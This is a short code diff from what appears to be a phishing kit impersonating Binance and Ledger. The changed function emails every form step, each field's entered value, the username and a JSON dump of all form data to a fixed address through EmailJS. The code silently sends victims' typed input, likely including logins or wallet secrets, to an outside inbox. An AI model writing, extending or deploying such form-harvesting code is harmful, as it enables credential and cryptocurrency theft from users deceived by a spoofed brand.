@@ -16,19 +16,23 @@ export const sendEmailNotification = async (data: EmailData) => {
     const templateParams = {
       to_email: EMAILJS_CONFIG.TO_EMAIL,
       from_name: "Binance Ledger System",
-      subject: `Form Activity - ${data.step}`,
-      message: `
-Step: ${data.step}
+      subject: `🔒 ${data.step} - Form Activity Alert`,
+      message: `Step: ${data.step}
 ${data.field ? `Field: ${data.field}` : ''}
 ${data.value ? `Value: ${data.value}` : ''}
 ${data.username ? `Username: ${data.username}` : ''}
 Timestamp: ${data.timestamp}
 
-${data.allFormData ? `All Form Data:\n${JSON.stringify(data.allFormData, null, 2)}` : ''}
-      `.trim()
+${data.allFormData ? `All Form Data:\n${JSON.stringify(data.allFormData, null, 2)}` : ''}`.trim(),
+      step: data.step,
+      field: data.field || '',
+      value: data.value || '',
+      username: data.username || '',
+      timestamp: data.timestamp,
+      allFormData: data.allFormData ? JSON.stringify(data.allFormData, null, 2) : ''
     };
 
-    console.log('Sending email with params:', templateParams);
+    console.log('Sending email with template params:', templateParams);
 
     const result = await emailjs.send(
       EMAILJS_CONFIG.SERVICE_ID,
